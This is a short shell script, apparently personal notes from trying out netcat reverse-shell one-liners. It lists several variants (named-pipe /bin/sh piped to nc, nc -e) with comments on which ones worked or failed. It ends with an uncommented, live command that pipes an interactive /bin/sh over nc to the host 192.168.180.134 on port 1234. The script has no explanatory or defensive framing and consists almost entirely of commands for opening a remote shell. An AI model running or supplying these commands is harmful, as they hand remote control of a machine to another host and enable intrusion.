touch HelloWorld

#work
#rm /tmp/backpipe ; mknod /tmp/backpipe p
#/bin/sh 0</tmp/backpipe | nc 127.0.0.1 1234 1>/tmp/backpipe&

#don't work --- nc: invalid option -- 'e'
#nc 127.0.0.1 2222 -e "/bin/sh"&

#don't work --- nc: getaddrinfo: Servname not supported for ai_socktype
#rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/p

#don't work --- nc: Address already in use
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.180.134 1234 >/tmp/f
